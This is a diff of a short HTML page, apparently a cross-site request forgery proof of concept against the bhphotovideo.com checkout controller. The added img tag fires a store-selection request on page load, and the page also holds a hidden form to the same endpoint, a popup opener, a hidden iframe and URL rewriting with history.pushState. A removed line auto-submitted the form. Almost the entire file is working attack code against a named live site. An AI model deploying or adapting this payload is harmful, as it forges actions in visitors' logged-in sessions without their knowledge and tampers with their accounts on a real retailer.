@@ -1,6 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
+	<script
+  src="https://code.jquery.com/jquery-3.6.0.js"
+  integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
+  crossorigin="anonymous"></script>
   <script>
 	function doJob(){
 		var child = window.open("https://www.bhphotovideo.com");
@@ -15,6 +19,8 @@
 	<p>HELLO! this is my sandbox testing site.</p>
 	<button onclick="doJob()">Try it out!</button>
 	
+	<img src="https://www.bhphotovideo.com/bnh/controller/home?Q=json&O=&A=selectStore&stage=checkout&json=Y&location=store" alt="img">
+	
    <script>history.pushState('', '', '/')</script>
 	<iframe name="votar" style="display:none;"></iframe>
     <form id="myForm" action="https://www.bhphotovideo.com/bnh/controller/home">
@@ -26,6 +32,5 @@
       <input type="hidden" name="location" value="store" />
       <input type="submit" value="Submit request" />
     </form>
-	<script>document.getElementById('myForm').submit();</script>
 </body>
 </html>
